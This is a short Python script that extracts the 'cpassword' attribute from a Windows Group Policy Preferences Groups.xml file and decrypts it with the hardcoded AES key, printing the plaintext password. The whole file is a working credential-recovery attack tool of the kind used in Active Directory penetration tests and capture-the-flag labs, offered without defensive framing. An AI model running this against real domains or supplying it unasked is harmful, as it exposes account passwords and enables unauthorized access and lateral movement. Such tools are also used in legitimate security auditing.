#!/usr/bin/python3
import base64
#pip install pycryptodome
from Crypto.Cipher import AES
import xml.etree.ElementTree as ET
import sys

def decrypt(encrypted_data):
    padding = "=" * (4 - (len(encrypted_data) % 4))
    epassword = f"{encrypted_data}{padding}"
    decoded = base64.b64decode(epassword)

    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    cipher = AES.new(key, AES.MODE_CBC, IV=b'\x00' * 16)
    plaintext = cipher.decrypt(decoded).decode('utf-8', 'ignore')

    return plaintext.strip()

def get_cpassword(xml_content):
    root = ET.fromstring(xml_content)
    cpassword = root.find(".//User/Properties").attrib["cpassword"]
    return cpassword

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Use: python3 script.py Groups.xml")
        sys.exit(1)

    xml_file = sys.argv[1]

    try:
        with open(xml_file, "r") as file:
            xml_content = file.read()
    except FileNotFoundError:
        print(f"[*] File '{xml_file}' could not be found.")
        sys.exit(1)

    cpassword = get_cpassword(xml_content)
    decrypted_password = decrypt(cpassword)

    print("Password:", decrypted_password)
